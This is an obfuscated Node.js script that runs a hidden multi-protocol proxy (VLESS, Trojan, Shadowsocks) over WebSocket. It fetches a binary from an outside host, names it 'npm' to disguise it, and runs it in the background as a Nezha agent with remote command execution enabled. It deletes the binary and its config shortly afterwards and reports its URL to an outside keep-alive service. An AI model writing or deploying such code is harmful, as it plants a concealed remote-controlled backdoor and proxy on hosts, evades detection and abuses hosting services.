#!/usr/bin/env node

const _0x142b0f=_0xd84a;(function(_0x1213ab,_0x42bc0c){const _0x2118e5=_0xd84a,_0x2c7a5d=_0x1213ab();while(!![]){try{const _0x128462=-parseInt(_0x2118e5(0xbc))/0x1+-parseInt(_0x2118e5(0xeb))/0x2+-parseInt(_0x2118e5(0xfa))/0x3+parseInt(_0x2118e5(0xce))/0x4+parseInt(_0x2118e5(0xb5))/0x5*(parseInt(_0x2118e5(0xdd))/0x6)+parseInt(_0x2118e5(0x10f))/0x7*(parseInt(_0x2118e5(0xdc))/0x8)+parseInt(_0x2118e5(0xa2))/0x9;if(_0x128462===_0x42bc0c)break;else _0x2c7a5d['push'](_0x2c7a5d['shift']());}catch(_0x166624){_0x2c7a5d['push'](_0x2c7a5d['shift']());}}}(_0x1f71,0x315d5));const os=require('os'),http=require(_0x142b0f(0xe6)),fs=require('fs'),axios=require('axios'),net=require(_0x142b0f(0xae)),path=require(_0x142b0f(0x11a)),crypto=require(_0x142b0f(0x101)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x142b0f(0x110)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x142b0f(0xf5)][_0x142b0f(0xe4)]||_0x142b0f(0xd0),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x142b0f(0xf5)][_0x142b0f(0x11b)]||'',NEZHA_KEY=process[_0x142b0f(0xf5)][_0x142b0f(0x8b)]||'',DOMAIN=process[_0x142b0f(0xf5)][_0x142b0f(0xff)]||_0x142b0f(0xd1),AUTO_ACCESS=process[_0x142b0f(0xf5)][_0x142b0f(0xd5)]||![],WSPATH=process[_0x142b0f(0xf5)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x142b0f(0xf5)][_0x142b0f(0xa3)]||_0x142b0f(0x10b),NAME=process['env']['NAME']||'',PORT=process[_0x142b0f(0xf5)][_0x142b0f(0x10e)]||0xbb8;function _0xd84a(_0x1d7082,_0x30f847){_0x1d7082=_0x1d7082-0x8b;const _0x1f7127=_0x1f71();let _0xd84a3b=_0x1f7127[_0x1d7082];return _0xd84a3b;}let uuid=UUID[_0x142b0f(0xf0)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x142b0f(0xb2),CurrentPort=0x1bb,ISP='';const DNS_SERVERS=['8.8.4.4',_0x142b0f(0xbf)],BLOCKED_DOMAINS=[_0x142b0f(0xb0),_0x142b0f(0xde),_0x142b0f(0x9d),_0x142b0f(0xbb),_0x142b0f(0xad),_0x142b0f(0xd9),_0x142b0f(0xc5),_0x142b0f(0x9f),_0x142b0f(0xca),_0x142b0f(0xb1)];function isBlockedDomain(_0x2f3ae5){const _0x31cf11=_0x142b0f;if(!_0x2f3ae5)return![];const _0xba98e6=_0x2f3ae5[_0x31cf11(0x107)]();return BLOCKED_DOMAINS[_0x31cf11(0x90)](_0x1ffe84=>{const _0x375cad=_0x31cf11;return _0xba98e6===_0x1ffe84||_0xba98e6[_0x375cad(0xb6)]('.'+_0x1ffe84);});}async function getisp(){const _0x3e38a5=_0x142b0f;try{const _0x4de236=await axios[_0x3e38a5(0xd4)](_0x3e38a5(0x104),{'headers':{'User-Agent':_0x3e38a5(0x93),'timeout':0xbb8}}),_0x1dfd7b=_0x4de236[_0x3e38a5(0x95)];ISP=(_0x1dfd7b[_0x3e38a5(0xa1)]+'-'+_0x1dfd7b[_0x3e38a5(0x100)])['replace'](/ /g,'_');}catch(_0x1477a6){try{const _0x269208=await axios[_0x3e38a5(0xd4)](_0x3e38a5(0xc9),{'headers':{'User-Agent':_0x3e38a5(0x93),'timeout':0xbb8}}),_0x454edf=_0x269208[_0x3e38a5(0x95)];ISP=(_0x454edf[_0x3e38a5(0x9c)]+'-'+_0x454edf[_0x3e38a5(0xc7)])[_0x3e38a5(0xf0)](/ /g,'_');}catch(_0x3ea9d7){ISP=_0x3e38a5(0xd7);}}}async function getip(){const _0x2b1e1e=_0x142b0f;if(!DOMAIN||DOMAIN===_0x2b1e1e(0xd1))try{const _0x4ee1eb=await axios[_0x2b1e1e(0xd4)](_0x2b1e1e(0x109),{'timeout':0x1388}),_0x11ce02=_0x4ee1eb['data'][_0x2b1e1e(0xec)]();CurrentDomain=_0x11ce02,Tls=_0x2b1e1e(0x9b),CurrentPort=PORT;}catch(_0x586324){console[_0x2b1e1e(0xfd)]('Failed\x20to\x20get\x20IP',_0x586324[_0x2b1e1e(0x97)]),(CurrentDomain=_0x2b1e1e(0xa0),Tls=_0x2b1e1e(0xb2),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x2b1e1e(0xb2),CurrentPort=0x1bb;}const httpServer=http[_0x142b0f(0xea)](async(_0x1542a4,_0x200a54)=>{const _0x236afa=_0x142b0f;if(_0x1542a4[_0x236afa(0xa8)]==='/'){const _0x4c6252=path[_0x236afa(0xda)](__dirname,_0x236afa(0xcd));fs[_0x236afa(0xe3)](_0x4c6252,'utf8',(_0x187ec4,_0xb66a72)=>{const _0x595d0a=_0x236afa;if(_0x187ec4){_0x200a54['writeHead'](0xc8,{'Content-Type':_0x595d0a(0xc6)}),_0x200a54[_0x595d0a(0xd2)]('Hello\x20world!');return;}_0x200a54[_0x595d0a(0x10a)](0xc8,{'Content-Type':'text/html'}),_0x200a54['end'](_0xb66a72);});return;}else{if(_0x1542a4['url']==='/'+SUB_PATH){await getisp(),await getip();const _0x343422=NAME?NAME+'-'+ISP:ISP,_0x3083cf=Tls===_0x236afa(0xb2)?_0x236afa(0xb2):_0x236afa(0x9b),_0xf7a18f=Tls==='tls'?'tls;':'',_0x139e32=_0x236afa(0xf2)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x236afa(0xcc)+_0x3083cf+'&sni='+CurrentDomain+'&fp=chrome&type=ws&host='+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x343422,_0x548364=_0x236afa(0x9e)+UUID+'@'+CurrentDomain+':'+CurrentPort+'?security='+_0x3083cf+_0x236afa(0xba)+CurrentDomain+_0x236afa(0xe2)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x343422,_0x17881e=Buffer[_0x236afa(0x106)](_0x236afa(0xe8)+UUID)[_0x236afa(0xb9)](_0x236afa(0xaa)),_0x2513ff='ss://'+_0x17881e+'@'+CurrentDomain+':'+CurrentPort+_0x236afa(0xf9)+CurrentDomain+';path%3D%2F'+WSPATH+';'+_0xf7a18f+_0x236afa(0xaf)+CurrentDomain+';skip-cert-verify%3Dtrue;mux%3D0#'+_0x343422,_0x121a96=_0x139e32+'\x0a'+_0x548364+'\x0a'+_0x2513ff,_0x2cb88c=Buffer['from'](_0x121a96)[_0x236afa(0xb9)]('base64');_0x200a54[_0x236afa(0x10a)](0xc8,{'Content-Type':_0x236afa(0x92)}),_0x200a54['end'](_0x2cb88c+'\x0a');}else _0x200a54[_0x236afa(0x10a)](0x194,{'Content-Type':_0x236afa(0x92)}),_0x200a54['end'](_0x236afa(0xfe));}});function resolveHost(_0x5186de){return new Promise((_0x1eb329,_0x39f3a4)=>{const _0x424b59=_0xd84a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x424b59(0xd3)](_0x5186de)){_0x1eb329(_0x5186de);return;}let _0x364894=0x0;function _0xa0d1c1(){const _0x597398=_0x424b59;if(_0x364894>=DNS_SERVERS['length']){_0x39f3a4(new Error(_0x597398(0xc2)+_0x5186de+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x47ce60=DNS_SERVERS[_0x364894];_0x364894++;const _0x11bf2d=_0x597398(0xc0)+encodeURIComponent(_0x5186de)+_0x597398(0x98);axios[_0x597398(0xd4)](_0x11bf2d,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x597398(0xb3)](_0x2ee1a5=>{const _0x301a5b=_0x597398,_0x3fc8ac=_0x2ee1a5[_0x301a5b(0x95)];if(_0x3fc8ac[_0x301a5b(0xbe)]===0x0&&_0x3fc8ac[_0x301a5b(0x115)]&&_0x3fc8ac[_0x301a5b(0x115)][_0x301a5b(0xf6)]>0x0){const _0xcfa62a=_0x3fc8ac[_0x301a5b(0x115)]['find'](_0x5094ef=>_0x5094ef[_0x301a5b(0xe9)]===0x1);if(_0xcfa62a){_0x1eb329(_0xcfa62a[_0x301a5b(0x95)]);return;}}_0xa0d1c1();})[_0x597398(0xf3)](_0x207e84=>{_0xa0d1c1();});}_0xa0d1c1();});}function handleVlsConnection(_0x386551,_0x2b03fa){const _0x4854a7=_0x142b0f,[_0x348ea2]=_0x2b03fa,_0x3977f3=_0x2b03fa[_0x4854a7(0xe7)](0x1,0x11);if(!_0x3977f3[_0x4854a7(0x10c)]((_0x3479ef,_0x218081)=>_0x3479ef==parseInt(uuid[_0x4854a7(0x108)](_0x218081*0x2,0x2),0x10)))return![];let _0x5126af=_0x2b03fa[_0x4854a7(0xe7)](0x11,0x12)[_0x4854a7(0xdb)]()+0x13;const _0x3d53e1=_0x2b03fa[_0x4854a7(0xe7)](_0x5126af,_0x5126af+=0x2)[_0x4854a7(0xa4)](0x0),_0x48d8b3=_0x2b03fa[_0x4854a7(0xe7)](_0x5126af,_0x5126af+=0x1)[_0x4854a7(0xdb)](),_0x30568f=_0x48d8b3==0x1?_0x2b03fa[_0x4854a7(0xe7)](_0x5126af,_0x5126af+=0x4)[_0x4854a7(0xda)]('.'):_0x48d8b3==0x2?new TextDecoder()[_0x4854a7(0xd6)](_0x2b03fa[_0x4854a7(0xe7)](_0x5126af+0x1,_0x5126af+=0x1+_0x2b03fa[_0x4854a7(0xe7)](_0x5126af,_0x5126af+0x1)[_0x4854a7(0xdb)]())):_0x48d8b3==0x3?_0x2b03fa[_0x4854a7(0xe7)](_0x5126af,_0x5126af+=0x10)[_0x4854a7(0x8e)]((_0x10c137,_0xf36972,_0x30a327,_0x1de4a)=>_0x30a327%0x2?_0x10c137[_0x4854a7(0xb4)](_0x1de4a[_0x4854a7(0xe7)](_0x30a327-0x1,_0x30a327+0x1)):_0x10c137,[])[_0x4854a7(0xbd)](_0x550240=>_0x550240['readUInt16BE'](0x0)['toString'](0x10))[_0x4854a7(0xda)](':'):'';if(isBlockedDomain(_0x30568f))return _0x386551[_0x4854a7(0x8d)](),![];_0x386551[_0x4854a7(0xef)](new Uint8Array([_0x348ea2,0x0]));const _0x4abec6=createWebSocketStream(_0x386551);return resolveHost(_0x30568f)[_0x4854a7(0xb3)](_0x4467b8=>{const _0x219eb5=_0x4854a7;net[_0x219eb5(0xfb)]({'host':_0x4467b8,'port':_0x3d53e1},function(){const _0x5bb3f7=_0x219eb5;this['write'](_0x2b03fa[_0x5bb3f7(0xe7)](_0x5126af)),_0x4abec6['on']('error',()=>{})[_0x5bb3f7(0x118)](this)['on'](_0x5bb3f7(0xfd),()=>{})[_0x5bb3f7(0x118)](_0x4abec6);})['on'](_0x219eb5(0xfd),()=>{});})[_0x4854a7(0xf3)](_0x1ad1a6=>{const _0x80594b=_0x4854a7;net[_0x80594b(0xfb)]({'host':_0x30568f,'port':_0x3d53e1},function(){const _0x2dd4e5=_0x80594b;this[_0x2dd4e5(0x114)](_0x2b03fa['slice'](_0x5126af)),_0x4abec6['on'](_0x2dd4e5(0xfd),()=>{})['pipe'](this)['on'](_0x2dd4e5(0xfd),()=>{})[_0x2dd4e5(0x118)](_0x4abec6);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0xa34887,_0x5d80bb){const _0x2ed680=_0x142b0f;try{if(_0x5d80bb[_0x2ed680(0xf6)]<0x3a)return![];const _0x4a82c3=_0x5d80bb[_0x2ed680(0xe7)](0x0,0x38)[_0x2ed680(0xb9)](),_0x213cea=[UUID];let _0xb3dc43=null;for(const _0x4dbaf1 of _0x213cea){const _0xacc183=crypto['createHash'](_0x2ed680(0x94))['update'](_0x4dbaf1)[_0x2ed680(0x9a)](_0x2ed680(0x117));if(_0xacc183===_0x4a82c3){_0xb3dc43=_0x4dbaf1;break;}}if(!_0xb3dc43)return![];let _0x4ab4a1=0x38;_0x5d80bb[_0x4ab4a1]===0xd&&_0x5d80bb[_0x4ab4a1+0x1]===0xa&&(_0x4ab4a1+=0x2);const _0x4b5ef4=_0x5d80bb[_0x4ab4a1];if(_0x4b5ef4!==0x1)return![];_0x4ab4a1+=0x1;const _0x47a307=_0x5d80bb[_0x4ab4a1];_0x4ab4a1+=0x1;let _0x87b8a3,_0xe0d0d7;if(_0x47a307===0x1)_0x87b8a3=_0x5d80bb[_0x2ed680(0xe7)](_0x4ab4a1,_0x4ab4a1+0x4)[_0x2ed680(0xda)]('.'),_0x4ab4a1+=0x4;else{if(_0x47a307===0x3){const _0x15e341=_0x5d80bb[_0x4ab4a1];_0x4ab4a1+=0x1,_0x87b8a3=_0x5d80bb['slice'](_0x4ab4a1,_0x4ab4a1+_0x15e341)['toString'](),_0x4ab4a1+=_0x15e341;}else{if(_0x47a307===0x4)_0x87b8a3=_0x5d80bb[_0x2ed680(0xe7)](_0x4ab4a1,_0x4ab4a1+0x10)[_0x2ed680(0x8e)]((_0x16ff7c,_0x5af8b2,_0x12f6ec,_0x10af17)=>_0x12f6ec%0x2?_0x16ff7c['concat'](_0x10af17['slice'](_0x12f6ec-0x1,_0x12f6ec+0x1)):_0x16ff7c,[])[_0x2ed680(0xbd)](_0xcdc9e6=>_0xcdc9e6[_0x2ed680(0xa4)](0x0)[_0x2ed680(0xb9)](0x10))['join'](':'),_0x4ab4a1+=0x10;else return![];}}_0xe0d0d7=_0x5d80bb[_0x2ed680(0xa4)](_0x4ab4a1),_0x4ab4a1+=0x2;_0x4ab4a1<_0x5d80bb[_0x2ed680(0xf6)]&&_0x5d80bb[_0x4ab4a1]===0xd&&_0x5d80bb[_0x4ab4a1+0x1]===0xa&&(_0x4ab4a1+=0x2);if(isBlockedDomain(_0x87b8a3))return _0xa34887['close'](),![];const _0x435a4a=createWebSocketStream(_0xa34887);return resolveHost(_0x87b8a3)[_0x2ed680(0xb3)](_0xdec1e1=>{const _0x4c5d71=_0x2ed680;net[_0x4c5d71(0xfb)]({'host':_0xdec1e1,'port':_0xe0d0d7},function(){const _0x235c2d=_0x4c5d71;_0x4ab4a1<_0x5d80bb['length']&&this[_0x235c2d(0x114)](_0x5d80bb[_0x235c2d(0xe7)](_0x4ab4a1)),_0x435a4a['on'](_0x235c2d(0xfd),()=>{})[_0x235c2d(0x118)](this)['on']('error',()=>{})[_0x235c2d(0x118)](_0x435a4a);})['on'](_0x4c5d71(0xfd),()=>{});})[_0x2ed680(0xf3)](_0x46e27b=>{const _0x25f03d=_0x2ed680;net[_0x25f03d(0xfb)]({'host':_0x87b8a3,'port':_0xe0d0d7},function(){const _0x3a9c6c=_0x25f03d;_0x4ab4a1<_0x5d80bb[_0x3a9c6c(0xf6)]&&this[_0x3a9c6c(0x114)](_0x5d80bb[_0x3a9c6c(0xe7)](_0x4ab4a1)),_0x435a4a['on'](_0x3a9c6c(0xfd),()=>{})[_0x3a9c6c(0x118)](this)['on'](_0x3a9c6c(0xfd),()=>{})[_0x3a9c6c(0x118)](_0x435a4a);})['on']('error',()=>{});}),!![];}catch(_0x5256f0){return![];}}function handleSsConnection(_0x27c1ec,_0x4e5f5d){const _0x3296d4=_0x142b0f;try{let _0xc972b1=0x0;const _0x492786=_0x4e5f5d[_0xc972b1];_0xc972b1+=0x1;let _0x1b5d41,_0x538d51;if(_0x492786===0x1)_0x1b5d41=_0x4e5f5d[_0x3296d4(0xe7)](_0xc972b1,_0xc972b1+0x4)[_0x3296d4(0xda)]('.'),_0xc972b1+=0x4;else{if(_0x492786===0x3){const _0x1299ec=_0x4e5f5d[_0xc972b1];_0xc972b1+=0x1,_0x1b5d41=_0x4e5f5d[_0x3296d4(0xe7)](_0xc972b1,_0xc972b1+_0x1299ec)['toString'](),_0xc972b1+=_0x1299ec;}else{if(_0x492786===0x4)_0x1b5d41=_0x4e5f5d[_0x3296d4(0xe7)](_0xc972b1,_0xc972b1+0x10)[_0x3296d4(0x8e)]((_0x2e1d2a,_0x18dcbb,_0x1c0d03,_0x2d4d1d)=>_0x1c0d03%0x2?_0x2e1d2a[_0x3296d4(0xb4)](_0x2d4d1d[_0x3296d4(0xe7)](_0x1c0d03-0x1,_0x1c0d03+0x1)):_0x2e1d2a,[])[_0x3296d4(0xbd)](_0x1fbe81=>_0x1fbe81[_0x3296d4(0xa4)](0x0)['toString'](0x10))['join'](':'),_0xc972b1+=0x10;else return![];}}_0x538d51=_0x4e5f5d[_0x3296d4(0xa4)](_0xc972b1),_0xc972b1+=0x2;if(isBlockedDomain(_0x1b5d41))return _0x27c1ec[_0x3296d4(0x8d)](),![];const _0xd4cccb=createWebSocketStream(_0x27c1ec);return resolveHost(_0x1b5d41)['then'](_0x57465b=>{const _0x32846f=_0x3296d4;net[_0x32846f(0xfb)]({'host':_0x57465b,'port':_0x538d51},function(){const _0x46a0d5=_0x32846f;_0xc972b1<_0x4e5f5d[_0x46a0d5(0xf6)]&&this[_0x46a0d5(0x114)](_0x4e5f5d[_0x46a0d5(0xe7)](_0xc972b1)),_0xd4cccb['on']('error',()=>{})[_0x46a0d5(0x118)](this)['on'](_0x46a0d5(0xfd),()=>{})[_0x46a0d5(0x118)](_0xd4cccb);})['on']('error',()=>{});})[_0x3296d4(0xf3)](_0xcf52b9=>{const _0xba02b6=_0x3296d4;net['connect']({'host':_0x1b5d41,'port':_0x538d51},function(){const _0x140304=_0xd84a;_0xc972b1<_0x4e5f5d[_0x140304(0xf6)]&&this['write'](_0x4e5f5d[_0x140304(0xe7)](_0xc972b1)),_0xd4cccb['on'](_0x140304(0xfd),()=>{})['pipe'](this)['on']('error',()=>{})[_0x140304(0x118)](_0xd4cccb);})['on'](_0xba02b6(0xfd),()=>{});}),!![];}catch(_0x1d071d){return![];}}const wss=new WebSocket[(_0x142b0f(0x116))]({'server':httpServer});wss['on'](_0x142b0f(0xc3),(_0x2fcd48,_0x5f2ecf)=>{const _0x2cc807=_0x142b0f,_0x28c659=_0x5f2ecf[_0x2cc807(0xa8)]||'',_0x455668='/'+WSPATH;if(!_0x28c659['startsWith'](_0x455668)){_0x2fcd48[_0x2cc807(0x8d)]();return;}_0x2fcd48[_0x2cc807(0xcf)](_0x2cc807(0x97),_0x299277=>{const _0x1d5350=_0x2cc807;if(_0x299277['length']>0x11&&_0x299277[0x0]===0x0){const _0x28fe37=_0x299277[_0x1d5350(0xe7)](0x1,0x11),_0x14561f=_0x28fe37[_0x1d5350(0x10c)]((_0x2afd04,_0x506533)=>_0x2afd04==parseInt(uuid[_0x1d5350(0x108)](_0x506533*0x2,0x2),0x10));if(_0x14561f){!handleVlsConnection(_0x2fcd48,_0x299277)&&_0x2fcd48[_0x1d5350(0x8d)]();return;}}if(_0x299277['length']>=0x3a){if(handleTrojConnection(_0x2fcd48,_0x299277))return;}if(_0x299277[_0x1d5350(0xf6)]>0x0&&(_0x299277[0x0]===0x1||_0x299277[0x0]===0x3||_0x299277[0x0]===0x4)){if(handleSsConnection(_0x2fcd48,_0x299277))return;}_0x2fcd48[_0x1d5350(0x8d)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3659f7=_0x142b0f,_0x7ec4de=os[_0x3659f7(0x112)]();return _0x7ec4de===_0x3659f7(0x99)||_0x7ec4de==='arm64'||_0x7ec4de==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x3659f7(0xe5):!NEZHA_PORT?_0x3659f7(0x113):_0x3659f7(0xf4);},downloadFile=async()=>{const _0x2be083=_0x142b0f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3b5959=getDownloadUrl(),_0x30f24a=await axios({'method':_0x2be083(0xd4),'url':_0x3b5959,'responseType':_0x2be083(0xd8)}),_0x647dbc=fs[_0x2be083(0x102)]('npm');return _0x30f24a[_0x2be083(0x95)][_0x2be083(0x118)](_0x647dbc),new Promise((_0x499741,_0xad0e2b)=>{const _0x15965e=_0x2be083;_0x647dbc['on'](_0x15965e(0xa9),()=>{const _0x42e19b=_0x15965e;console[_0x42e19b(0xc4)](_0x42e19b(0x103)),exec(_0x42e19b(0xf1),_0x3f4834=>{if(_0x3f4834)_0xad0e2b(_0x3f4834);_0x499741();});}),_0x647dbc['on']('error',_0xad0e2b);});}catch(_0x27fe84){throw _0x27fe84;}},runnz=async()=>{const _0x3524e9=_0x142b0f;try{const _0x50d936=execSync(_0x3524e9(0xee),{'encoding':_0x3524e9(0xf8)});if(_0x50d936[_0x3524e9(0xec)]()!==''){console[_0x3524e9(0xc4)](_0x3524e9(0xab));return;}}catch(_0x5f552a){}await downloadFile();let _0x129a59='',_0x5ae719=[_0x3524e9(0xf7),'8443','2096',_0x3524e9(0xa6),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2e8007=_0x5ae719[_0x3524e9(0xed)](NEZHA_PORT)?_0x3524e9(0x96):'';_0x129a59=_0x3524e9(0xa7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3524e9(0xac)+NEZHA_KEY+'\x20'+_0x2e8007+_0x3524e9(0x91);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x221e0c=NEZHA_SERVER[_0x3524e9(0xed)](':')?NEZHA_SERVER[_0x3524e9(0xb8)](':')[_0x3524e9(0x8c)]():'',_0x87c884=_0x5ae719[_0x3524e9(0xed)](_0x221e0c)?'true':'false',_0x5db869=_0x3524e9(0xb7)+NEZHA_KEY+_0x3524e9(0xe1)+NEZHA_SERVER+_0x3524e9(0xa5)+_0x87c884+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3524e9(0xdf)](_0x3524e9(0x8f),_0x5db869);}_0x129a59=_0x3524e9(0xc8);}else return;}try{exec(_0x129a59,{'shell':_0x3524e9(0xcb)},_0x164749=>{const _0x3f6e5b=_0x3524e9;if(_0x164749)console[_0x3f6e5b(0xfd)](_0x3f6e5b(0x119),_0x164749);else console[_0x3f6e5b(0xc4)]('npm\x20is\x20running');});}catch(_0x4101e9){console[_0x3524e9(0xfd)]('error:\x20'+_0x4101e9);}};async function addAccessTask(){const _0x4f30ba=_0x142b0f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x285303='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x25808a=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x285303},{'headers':{'Content-Type':_0x4f30ba(0x10d)}});console['log'](_0x4f30ba(0xc1));}catch(_0xbde7e0){}}function _0x1f71(){const _0x40d1ad=['https://dns.google/resolve?name=','Automatic\x20Access\x20Task\x20added\x20successfully','Failed\x20to\x20resolve\x20','connection','log','bandwidth.place','text/html','org','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','http://ip-api.com/json','librespeed.org','/bin/bash','?encryption=none&security=','index.html','501320fjLWfi','once','fc1dcdd5-12a2-4a33-8473-ce9e1ac40e22','your-domain.com','end','test','get','AUTO_ACCESS','decode','Unknown','stream','testmy.net','join','readUInt8','3048gEquij','1615242bSIfiu','fast.com','writeFileSync','npm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=chrome&type=ws&host=','readFile','UUID','https://arm64.ssss.nyc.mn/agent','http','slice','none:','type','createServer','56408ggMjcX','trim','includes','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','replace','chmod\x20+x\x20npm','vless://','catch','https://amd64.ssss.nyc.mn/agent','env','length','443','utf-8','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','397137FpZevC','connect','listen','error','Not\x20Found\x0a','DOMAIN','isp','crypto','createWriteStream','npm\x20download\x20successfully','https://api.ip.sb/geoip','forEach','from','toLowerCase','substr','https://api-ipv4.ip.sb/ip','writeHead','sub','every','application/json','PORT','700TaNCHC','child_process','unlink','arch','https://amd64.ssss.nyc.mn/v1','write','Answer','Server','hex','pipe','npm\x20running\x20error:','path','NEZHA_PORT','NEZHA_KEY','pop','close','reduce','config.yaml','some','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/plain','Mozilla/5.0','sha224','data','--tls','message','&type=A','arm','digest','none','countryCode','speedtest.cn','trojan://','speed.io','cahnge-your-domain.com','country_code','2972583egSoZi','SUB_PATH','readUInt16BE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2087','setsid\x20nohup\x20./npm\x20-s\x20','url','finish','base64','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20-p\x20','speedof.me','net','sni%3D','speedtest.net','speedcheck.org','tls','then','concat','5IqmENu','endsWith','client_secret:\x20','split','toString','&sni=','speed.cloudflare.com','400144zrUOEA','map','Status','1.1.1.1'];_0x1f71=function(){return _0x40d1ad;};return _0x1f71();}const delFiles=()=>{const _0x39f4b6=_0x142b0f;[_0x39f4b6(0xe0),_0x39f4b6(0x8f)][_0x39f4b6(0x105)](_0x3b19cd=>fs[_0x39f4b6(0x111)](_0x3b19cd,()=>{}));};httpServer[_0x142b0f(0xfc)](PORT,()=>{const _0x4bc677=_0x142b0f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4bc677(0xc4)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
